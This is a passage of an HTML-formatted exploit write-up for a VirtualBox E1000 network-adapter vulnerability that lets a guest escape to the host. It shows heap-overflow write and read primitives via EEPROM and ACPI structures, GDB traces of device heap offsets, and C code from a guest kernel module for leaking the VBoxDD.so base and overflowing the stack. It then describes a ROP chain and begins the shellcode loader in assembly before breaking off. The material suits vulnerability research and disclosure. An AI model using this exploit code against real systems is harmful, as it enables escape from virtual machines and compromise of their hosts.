    &lt;span class=&quot;pl-c1&quot;&gt;configure_TDLEN&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;configure_TCTL&lt;/span&gt;(mmio);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;ASLR Bypass&lt;/h3&gt;
&lt;h4&gt;Write primitive&lt;/h4&gt;
&lt;p&gt;From the beginning of exploit development I decided not to use primitives found in services disabled by default. This means in the first place the Chromium service (not a browser) that provides for 3D acceleration where more than 40 vulnerabilities are found by researchers in the last year.&lt;/p&gt;
&lt;p&gt;The problem was to find an information leak in default VirtualBox subsystems. The obvious thought was that if the integer underflow allows to overflow the heap buffer then we control anything past the buffer. We'll see that not a single additional vulnerability was required: the integer underflow appeared to be quite powerful to derive read, write, and information leak primitives from it, not saying of the stack buffer overflow.&lt;/p&gt;
&lt;p&gt;Let's examine what exactly is overflowed on the heap.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;*&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; * Device state structure.&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;struct&lt;/span&gt; E1kState_st
{
...
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;     aTxPacketFallback[E1K_MAX_TX_PKT_SIZE];
...
    E1kEEPROM   eeprom;
...
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here aTxPacketFallback is a buffer of size 0x3FA0 which will be overflowed with bytes copied from a data descriptor. Searching for interesting fields after the buffer I came to E1kEEPROM structure which contains another structure with the following fields (src/VBox/Devices/Network/DevE1000.cpp):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/*&lt;/span&gt;*&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; * 93C46-compatible EEPROM device emulation.&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt; &lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;struct&lt;/span&gt; EEPROM93C46
{
...
    &lt;span class=&quot;pl-k&quot;&gt;bool&lt;/span&gt; m_fWriteEnabled;
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt; Alignment1;
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; m_u16Word;
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; m_u16Mask;
    &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; m_u16Addr;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; m_u32InternalWires;
...
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;How can we abuse them? E1000 implements EEPROM, secondary adaptor memory. The guest OS can access it via E1000 MMIO registers. EEPROM is implemented as a finite automaton with several states and does four actions. We are interested only in &quot;write to memory&quot;. This is how it looks (src/VBox/Devices/Network/DevEEPROM.cpp):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
EEPROM93C46::State &lt;span class=&quot;pl-en&quot;&gt;EEPROM93C46::opWrite&lt;/span&gt;()
{
    &lt;span class=&quot;pl-c1&quot;&gt;storeWord&lt;/span&gt;(m_u16Addr, m_u16Word);
    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; WAITING_CS_FALL;
}

&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;EEPROM93C46::storeWord&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; u32Addr, &lt;span class=&quot;pl-c1&quot;&gt;uint16_t&lt;/span&gt; u16Value)
{
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (m_fWriteEnabled) {
        &lt;span class=&quot;pl-c1&quot;&gt;E1kLog&lt;/span&gt;((&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;EEPROM: Stored word &lt;span class=&quot;pl-c1&quot;&gt;%04x&lt;/span&gt; at &lt;span class=&quot;pl-c1&quot;&gt;%08x&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, u16Value, u32Addr));
        m_au16Data[u32Addr] = u16Value;
    }
    m_u16Mask = DATA_MSB;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here m_u16Addr, m_u16Word, and m_fWriteEnabled are fields of EEPROM93C46 structure we control. We can malform them in a way that&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
m_au16Data[u32Addr] = u16Value;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;statement will write two bytes at arbitrary 16-bit offset from m_au16Data that also residing in the structure. We have found a write primitive.&lt;/p&gt;
&lt;h4&gt;Read primitive&lt;/h4&gt;
&lt;p&gt;The next problem was to find data structures on the heap to write arbitrary data into, pursuing the main goal to leak a shared library pointer to get its image base. Hopefully, it was need not to do an unstable heap spray because virtual devices' main data structures appeared to be allocated from an internal hypervisor heap in the way that the distance between them is always constant, despite that their virtual addresses, of course, are randomized by ASLR.&lt;/p&gt;
&lt;p&gt;When a virtual machine is launched the PDM (Pluggable Device and Driver Manager) subsystem allocates PDMDEVINS objects in the hypervisor heap.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;pdmR3DevInit&lt;/span&gt;(PVM pVM)
{
...
        PPDMDEVINS pDevIns;
        &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (paDevs[i].&lt;span class=&quot;pl-smi&quot;&gt;pDev&lt;/span&gt;-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;pReg&lt;/span&gt;-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;fFlags&lt;/span&gt; &amp;amp; (PDM_DEVREG_FLAGS_RC | PDM_DEVREG_FLAGS_R0))
            rc = &lt;span class=&quot;pl-c1&quot;&gt;MMR3HyperAllocOnceNoRel&lt;/span&gt;(pVM, cb, &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;, MM_TAG_PDM_DEVICE, (&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; **)&amp;amp;pDevIns);
        &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt;
            rc = &lt;span class=&quot;pl-c1&quot;&gt;MMR3HeapAllocZEx&lt;/span&gt;(pVM, MM_TAG_PDM_DEVICE, cb, (&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; **)&amp;amp;pDevIns);
...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I traced that code under GDB using a script and got these results:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[trace-device-constructors] Constructing a device #0x0:
[trace-device-constructors] Name: &quot;pcarch&quot;, '\000' &amp;lt;repeats 25 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6f125a &quot;PC Architecture Device&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d57517b &amp;lt;pcarchConstruct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc45486c1b0
[trace-device-constructors] Data size: 0x8

[trace-device-constructors] Constructing a device #0x1:
[trace-device-constructors] Name: &quot;pcbios&quot;, '\000' &amp;lt;repeats 25 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6ef37b &quot;PC BIOS Device&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d56bd3b &amp;lt;pcbiosConstruct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc45486c720
[trace-device-constructors] Data size: 0x11e8

...

[trace-device-constructors] Constructing a device #0xe:
[trace-device-constructors] Name: &quot;e1000&quot;, '\000' &amp;lt;repeats 26 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d70c6d0 &quot;Intel PRO/1000 MT Desktop Ethernet.\n&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d622969 &amp;lt;e1kR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc470083400
[trace-device-constructors] Data size: 0x53a0

[trace-device-constructors] Constructing a device #0xf:
[trace-device-constructors] Name: &quot;ichac97&quot;, '\000' &amp;lt;repeats 24 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d716ac0 &quot;ICH AC'97 Audio Controller&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d66a90f &amp;lt;ichac97R3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc470088b00
[trace-device-constructors] Data size: 0x1848

[trace-device-constructors] Constructing a device #0x10:
[trace-device-constructors] Name: &quot;usb-ohci&quot;, '\000' &amp;lt;repeats 23 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d707025 &quot;OHCI USB controller.\n&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d5ea841 &amp;lt;ohciR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc47008a4e0
[trace-device-constructors] Data size: 0x1728

[trace-device-constructors] Constructing a device #0x11:
[trace-device-constructors] Name: &quot;acpi&quot;, '\000' &amp;lt;repeats 27 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6eced8 &quot;Advanced Configuration and Power Interface&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d563431 &amp;lt;acpiR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc47008be70
[trace-device-constructors] Data size: 0x1570

[trace-device-constructors] Constructing a device #0x12:
[trace-device-constructors] Name: &quot;GIMDev&quot;, '\000' &amp;lt;repeats 25 times&amp;gt;
[trace-device-constructors] Description: 0x7fc44d6f17fa &quot;VirtualBox GIM Device&quot;
[trace-device-constructors] Constructor: {int (PPDMDEVINS, int, PCFGMNODE)} 0x7fc44d575cde &amp;lt;gimdevR3Construct(PPDMDEVINS, int, PCFGMNODE)&amp;gt;
[trace-device-constructors] Instance: 0x7fc47008dba0
[trace-device-constructors] Data size: 0x90

[trace-device-constructors] Instances:
[trace-device-constructors] #0x0 Address: 0x7fc45486c1b0
[trace-device-constructors] #0x1 Address 0x7fc45486c720 differs from previous by 0x570
[trace-device-constructors] #0x2 Address 0x7fc4700685f0 differs from previous by 0x1b7fbed0
[trace-device-constructors] #0x3 Address 0x7fc4700696d0 differs from previous by 0x10e0
[trace-device-constructors] #0x4 Address 0x7fc47006a0d0 differs from previous by 0xa00
[trace-device-constructors] #0x5 Address 0x7fc47006a450 differs from previous by 0x380
[trace-device-constructors] #0x6 Address 0x7fc47006a920 differs from previous by 0x4d0
[trace-device-constructors] #0x7 Address 0x7fc47006ad50 differs from previous by 0x430
[trace-device-constructors] #0x8 Address 0x7fc47006b240 differs from previous by 0x4f0
[trace-device-constructors] #0x9 Address 0x7fc4548ec9a0 differs from previous by 0x-1b77e8a0
[trace-device-constructors] #0xa Address 0x7fc470075f90 differs from previous by 0x1b7895f0
[trace-device-constructors] #0xb Address 0x7fc488022000 differs from previous by 0x17fac070
[trace-device-constructors] #0xc Address 0x7fc47007cf80 differs from previous by 0x-17fa5080
[trace-device-constructors] #0xd Address 0x7fc4700820f0 differs from previous by 0x5170
[trace-device-constructors] #0xe Address 0x7fc470083400 differs from previous by 0x1310
[trace-device-constructors] #0xf Address 0x7fc470088b00 differs from previous by 0x5700
[trace-device-constructors] #0x10 Address 0x7fc47008a4e0 differs from previous by 0x19e0
[trace-device-constructors] #0x11 Address 0x7fc47008be70 differs from previous by 0x1990
[trace-device-constructors] #0x12 Address 0x7fc47008dba0 differs from previous by 0x1d30
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Note the E1000 device at #0xE position. It can be seen in the second list that the following device is at 0x5700 offset from E1000, the next is at 0x19E0 and so on. We already said that these distances are always the same, and it's our exploitation opportunity.&lt;/p&gt;
&lt;p&gt;Devices following E1000 are ICH IC'97, OHCI, ACPI, VirtualBox GIM. Learning their data structures I figured the way to use the write primitive.&lt;/p&gt;
&lt;p&gt;On virtual machine boot up the ACPI device is created (src/VBox/Devices/PC/DevACPI.cpp):&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;struct&lt;/span&gt; ACPIState
{
...
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;             au8SMBusBlkDat[&lt;span class=&quot;pl-c1&quot;&gt;32&lt;/span&gt;];
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;             u8SMBusBlkIdx;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            uPmTimeOld;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            uPmTimeA;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            uPmTimeB;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            Alignment5;
} ACPIState;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;An ACPI port input/output handler is registered for 0x4100-0x410F range. In the case of 0x4107 port we have:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;PDMBOTHCBDECL&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt;) acpiR3SMBusRead(PPDMDEVINS pDevIns, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; *pvUser, RTIOPORT Port, &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; *pu32, &lt;span class=&quot;pl-k&quot;&gt;unsigned&lt;/span&gt; cb)
{
    &lt;span class=&quot;pl-c1&quot;&gt;RT_NOREF1&lt;/span&gt;(pDevIns);
    ACPIState *pThis = (ACPIState *)pvUser;
...
    &lt;span class=&quot;pl-k&quot;&gt;switch&lt;/span&gt; (off)
    {
...
        &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; SMBBLKDAT_OFF:
            *pu32 = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;au8SMBusBlkDat&lt;/span&gt;[pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u8SMBusBlkIdx&lt;/span&gt;];
            pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u8SMBusBlkIdx&lt;/span&gt;++;
            pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u8SMBusBlkIdx&lt;/span&gt; &amp;amp;= &lt;span class=&quot;pl-k&quot;&gt;sizeof&lt;/span&gt;(pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;au8SMBusBlkDat&lt;/span&gt;) - &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When the guest OS executes INB(0x4107) instruction to read one byte from the port, the handler takes one bytes from au8SMBusBlkDat[32] array at u8SMBusBlkIdx index and returns it to the guest. And this is how to apply the write primitive: since the distance between virtual device heap blocks are constant, so is the distance from EEPROM93C46.m_au16Data array to ACPIState.u8SMBusBlkIdx. Writing two bytes to ACPIState.u8SMBusBlkIdx we can read arbitrary data in the range of 255 bytes from ACPIState.au8SMBusBlkDat.&lt;/p&gt;
&lt;p&gt;There is an obstacle. Having a look to ACPIState structure it can be seen that the array is placed at the end of the structure. The remaining fields are useless to leak. So let's look what can be found after the structure:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gef➤  x/16gx (ACPIState*)(0x7fc47008be70+0x100)+1
0x7fc47008d4e0: 0xffffe98100000090      0xfffd9b2000000000
0x7fc47008d4f0: 0x00007fc470067a00      0x00007fc470067a00
0x7fc47008d500: 0x00000000a0028a00      0x00000000000e0000
0x7fc47008d510: 0x00000000000e0fff      0x0000000000001000
0x7fc47008d520: 0x000000ff00000002      0x0000100000000000
0x7fc47008d530: 0x00007fc47008c358      0x00007fc44d6ecdc6
0x7fc47008d540: 0x0031000035944000      0x00000000000002b8
0x7fc47008d550: 0x00280001d3878000      0x0000000000000000
gef➤  x/s 0x00007fc44d6ecdc6
0x7fc44d6ecdc6: &quot;ACPI RSDP&quot;
gef➤  vmmap VBoxDD.so
Start                           End                             Offset                          Perm Path
0x00007fc44d4f3000 0x00007fc44d768000 0x0000000000000000 r-x /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d768000 0x00007fc44d968000 0x0000000000275000 --- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d968000 0x00007fc44d977000 0x0000000000275000 r-- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d977000 0x00007fc44d980000 0x0000000000284000 rw- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
gef➤  p 0x00007fc44d6ecdc6 - 0x00007fc44d4f3000
$2 = 0x1f9dc6
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;It seems there is a pointer to a string placed at a fixed offset from VBoxDD.so image base. The pointer lies at 0x58 offset at the end of ACPIState. We can read that pointer byte-by-byte using the primitives and finally obtain VBoxDD.so image base. We just hope that data past ACPIState structure is not random on each virtual machine boot. Hopefully, it isn't; the pointer at 0x58 offset is always there.&lt;/p&gt;
&lt;h4&gt;Information Leak&lt;/h4&gt;
&lt;p&gt;Now we combine write and read primitives and exploit them to bypass ASLR. We will overflow the heap overwriting EEPROM93C46 structure, then trigger EEPROM finite automaton to write the index to ACPIState structure, and then execute INB(0x4107) in the guest to access ACPI to read one byte of the pointer. Repeat those 8 times incrementing the index by 1.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;stage_1_main&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* tx_ring) {
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;##### Stage 1 #####&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; When loopback mode is enabled data (network packets actually) of every Tx Data Descriptor &lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; is sent back to the guest and handled right now via e1kHandleRxPacket.&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; When loopback mode is disabled data is sent to a network as usual.&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; We disable loopback mode here, at Stage 1, to overflow the heap but not touch the stack buffer&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; in e1kHandleRxPacket. Later, at Stage 2 we enable loopback mode to overflow heap and &lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; the stack buffer.&lt;/span&gt;
    &lt;span class=&quot;pl-c1&quot;&gt;e1000_disable_loopback_mode&lt;/span&gt;(mmio);

    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt; leaked_bytes[&lt;span class=&quot;pl-c1&quot;&gt;8&lt;/span&gt;];
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; i;
    &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; (i = &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;pl-c1&quot;&gt;8&lt;/span&gt;; i++) {
        &lt;span class=&quot;pl-c1&quot;&gt;stage_1_overflow_heap_buffer&lt;/span&gt;(mmio, tx_ring, i);
        leaked_bytes[i] = &lt;span class=&quot;pl-c1&quot;&gt;stage_1_leak_byte&lt;/span&gt;();

        &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Byte &lt;span class=&quot;pl-c1&quot;&gt;%d&lt;/span&gt; leaked: 0x&lt;span class=&quot;pl-c1&quot;&gt;%02X&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, i, leaked_bytes[i]);
    }

    &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; leaked_vboxdd_ptr = *(&lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt;*)leaked_bytes;
    &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_RVA;
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Leaked VBoxDD.so pointer: 0x&lt;span class=&quot;pl-c1&quot;&gt;%016llx&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, leaked_vboxdd_ptr);
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Leaked VBoxDD.so base: 0x&lt;span class=&quot;pl-c1&quot;&gt;%016llx&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, vboxdd_base);

    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; vboxdd_base;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It has been said that in order for the integer underflow not to lead to the stack buffer overflow, certain E1000 registers should been configured. The idea is that the buffer is being overflowed in e1kHandleRxPacket function which is called while handling Tx descriptors in the loopback mode. Indeed, in the loopback mode the guest sends network packets to itself so they are received right after being sent. We disable this mode so e1kHandleRxPacket is unreachable.&lt;/p&gt;
&lt;h3&gt;DEP Bypass&lt;/h3&gt;
&lt;p&gt;We have bypassed ASLR. Now the loopback mode can be enabled and the stack buffer overflow can be triggered.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;stage_2_overflow_heap_and_stack_buffers&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* tx_ring, &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; vboxdd_base) {
    &lt;span class=&quot;pl-c1&quot;&gt;off_t&lt;/span&gt; buffer_pa;
    &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* buffer_va;
    &lt;span class=&quot;pl-c1&quot;&gt;alloc_buffer&lt;/span&gt;(&amp;amp;buffer_pa, &amp;amp;buffer_va);

    &lt;span class=&quot;pl-c1&quot;&gt;stage_2_set_up_buffer&lt;/span&gt;(buffer_va, vboxdd_base);
    &lt;span class=&quot;pl-c1&quot;&gt;stage_2_trigger_overflow&lt;/span&gt;(mmio, tx_ring, buffer_pa);

    &lt;span class=&quot;pl-c1&quot;&gt;free_buffer&lt;/span&gt;(buffer_va);
}

&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;stage_2_main&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* tx_ring, &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; vboxdd_base) {
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;##### Stage 2 #####&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);

    &lt;span class=&quot;pl-c1&quot;&gt;e1000_enable_loopback_mode&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;stage_2_overflow_heap_and_stack_buffers&lt;/span&gt;(mmio, tx_ring, vboxdd_base);
    &lt;span class=&quot;pl-c1&quot;&gt;e1000_disable_loopback_mode&lt;/span&gt;(mmio);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For now, when the last instruction of e1kHandleRxPacket is executed the saved return address is overwritten and control is transferred anywhere the attacker wants. But DEP is still there. It is bypassed in a classical way of building a ROP chain. ROP gadgets allocate executable memory, copy a shellcode loader into and execute it.&lt;/p&gt;
&lt;h3&gt;Shellcode&lt;/h3&gt;
&lt;p&gt;The shellcode loader is trivial. It copies the beginning of the overflowing buffer next to it.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-assembly&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;use64&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;start:&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x4170&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pl-c&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; loader_size&lt;/span&gt;
